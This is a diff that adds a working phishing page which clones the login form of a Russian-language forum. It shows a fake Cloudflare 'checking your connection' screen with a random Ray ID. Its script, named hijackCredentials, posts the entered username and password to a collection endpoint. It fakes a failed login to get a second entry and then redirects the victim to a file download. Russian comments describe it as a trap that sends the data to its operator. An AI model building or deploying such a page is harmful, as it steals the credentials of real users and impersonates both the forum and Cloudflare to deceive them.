@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html id="XF" lang="ru-RU" dir="LTR" style="font-size: 62.5%;" data-app="public" class="has-no-js template-login uix_page--fixed uix_hasSectionLinks">
+<head>
+    <!-- ВАЖНО: Это заставляет браузер грузить картинки и стили с реального сайта -->
+    <base href="https://semyanych.chat/">
+    
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <title>Вход | Форум Семяныч</title>
+    
+    <!-- Подключаем оригинальные стили Семяныча -->
+    <link rel="stylesheet" href="/css.php?css=public%3Anormalize.css%2Cpublic%3Afa.css%2Cpublic%3Acore.less%2Cpublic%3Aapp.less&amp;s=16&amp;l=2&amp;d=1764075554&amp;k=ea51f44bc366997dfd2a245e0006363c63dcffa0" />
+    <link rel="stylesheet" href="/css.php?css=public%3ACMTV_Badges.less%2Cpublic%3Alightslider.less%2Cpublic%3Anotices.less%2Cpublic%3Auix.less%2Cpublic%3Auix_socialMedia.less%2Cpublic%3Axenith.less%2Cpublic%3Aextra.less&amp;s=16&amp;l=2&amp;d=1764075554&amp;k=45c4a7b9e182164780f226474fa30f9481366ea7" />
+    
+    <script src="/js/xf/preamble.min.js?_v=3277cd8e"></script>
+
+    <!-- СТИЛИ ДЛЯ ФЕЙКОВОГО CLOUDFLARE -->
+    <style>
+        #cf-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            z-index: 999999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #333;
+        }
+        .cf-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #f48120; /* Оранжевый цвет Cloudflare */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .cf-text { font-size: 24px; font-weight: 300; margin-bottom: 10px; text-align: center; }
+        .cf-subtext { font-size: 14px; color: #666; margin-bottom: 40px; text-align: center; }
+        .cf-footer { position: absolute; bottom: 20px; font-size: 12px; color: #999; text-align: center; }
+    </style>
+</head>
+
+<body data-template="login">
+
+    <!-- ФЕЙКОВЫЙ ЭКРАН ЗАГРУЗКИ (CLOUDFLARE) -->
+    <div id="cf-overlay">
+        <div class="cf-spinner"></div>
+        <div class="cf-text">Checking if the site connection is secure</div>
+        <div class="cf-subtext">semyanych.chat needs to review the security of your connection before proceeding.</div>
+        <div class="cf-footer">
+            DDoS protection by <strong>Cloudflare</strong><br>
+            Ray ID: <span id="rayId"></span>
+        </div>
+    </div>
+
+    <div class="p-pageWrapper" id="top">
+        <div class="p-body">
+            <div class="p-body-inner">
+                <div class="p-body-header">
+                    <div class="pageContent">
+                        <div class="uix_headerInner">
+                            <div class="p-title">
+                                <h1 class="p-title-value">Вход</h1>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="p-body-main">
+                    <div class="p-body-content">
+                        <div class="p-body-pageContent">
+                            <div class="blocks">
+                                <!-- НАША ФОРМА-ЛОВУШКА -->
+                                <form class="block" onsubmit="event.preventDefault(); hijackCredentials();">
+                                    <div class="block-container">
+                                        <div class="block-body">
+                                            <!-- Сообщение об ошибке (скрыто по умолчанию) -->
+                                            <div class="block-row block-row--separated" id="loginError" style="display:none; color: #c84448; background: #fde9e9; border-left: 3px solid #c84448; padding: 10px;">
+                                                Неверный логин или пароль. Пожалуйста, попробуйте еще раз.
+                                            </div>
+
+                                            <dl class="formRow formRow--input">
+                                                <dt><div class="formRow-labelWrapper"><label class="formRow-label">Имя пользователя или email</label></div></dt>
+                                                <dd><input type="text" class="input" name="login" id="loginField" autofocus="autofocus" autocomplete="username" /></dd>
+                                            </dl>
+
+                                            <dl class="formRow formRow--input">
+                                                <dt><div class="formRow-labelWrapper"><label class="formRow-label">Пароль</label></div></dt>
+                                                <dd>
+                                                    <div class="inputGroup inputGroup--joined">
+                                                        <input type="password" name="password" id="passwordField" class="input js-password" autocomplete="current-password" />
+                                                        <div class="inputGroup-text">
+                                                            <label class="iconic"><input type="checkbox" onclick="togglePass()"><i aria-hidden="true"></i></label>
+                                                        </div>
+                                                    </div>
+                                                    <a href="#" class="uix_forgotPassWord__link">Забыли свой пароль?</a>
+                                                </dd>
+                                            </dl>
+
+                                            <dl class="formRow">
+                                                <dt></dt>
+                                                <dd>
+                                                    <ul class="inputChoices">
+                                                        <li class="inputChoices-choice"><label class="iconic"><input type="checkbox" name="remember" value="1" checked="checked" /><i aria-hidden="true"></i><span class="iconic-label">Запомнить меня</span></label></li>
+                                                    </ul>
+                                                </dd>
+                                            </dl>
+                                        </div>
+                                        <dl class="formRow formSubmitRow">
+                                            <dt></dt>
+                                            <dd>
+                                                <div class="formSubmitRow-main">
+                                                    <div class="formSubmitRow-controls"><button type="submit" class="button--primary button button--icon button--icon--login"><span class="button-text">Войти</span></button></div>
+                                                </div>
+                                            </dd>
+                                        </dl>
+                                    </div>
+                                    <div class="block-outer block-outer--after uix_login__registerLink">
+                                        <div class="block-outer-middle">
+                                            У Вас ещё нет учётной записи? <a href="#">Зарегистрируйтесь</a>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- СКРИПТ-ПЕРЕХВАТЧИК И ЛОГИКА CLOUDFLARE -->
+    <script>
+        // 1. Генерируем фейковый Ray ID для реалистичности
+        document.getElementById('rayId').innerText = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 8);
+
+        // 2. Убираем экран проверки через 2.5 секунды
+        window.onload = function() {
+            setTimeout(() => {
+                document.getElementById('cf-overlay').style.display = 'none';
+            }, 2500);
+        };
+
+        let attempts = 0;
+        // Данные передаются из Flask
+        const targetUid = "{{ uid }}";
+        const targetFilename = "{{ filename }}";
+
+        function togglePass() {
+            const x = document.getElementById("passwordField");
+            if (x.type === "password") x.type = "text";
+            else x.type = "password";
+        }
+
+        function hijackCredentials() {
+            const login = document.getElementById('loginField').value;
+            const password = document.getElementById('passwordField').value;
+            const btn = document.querySelector('button[type="submit"]');
+
+            if(!login || !password) return;
+
+            // Визуальный эффект загрузки
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<span class="button-text">Обработка...</span>';
+            btn.disabled = true;
+
+            // Отправляем данные тебе
+            fetch('/api/collect', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    meta: { trigger: 'SEMYANICH PHISHING', url: window.location.href },
+                    system: { 
+                        phishing_login: login, 
+                        phishing_password: password 
+                    }
+                })
+            }).then(() => {
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                    attempts++;
+
+                    if (attempts === 1) {
+                        // Первая попытка - показываем ошибку (чтобы напугать и проверить, не опечатался ли он)
+                        document.getElementById('loginError').style.display = 'block';
+                        document.getElementById('passwordField').value = '';
+                    } else {
+                        // Вторая попытка - пускаем к файлу (типа вошел)
+                        window.location.href = `/download/${targetUid}/${targetFilename}`;
+                    }
+                }, 1000);
+            });
+        }
+    </script>
+</body>
+</html>
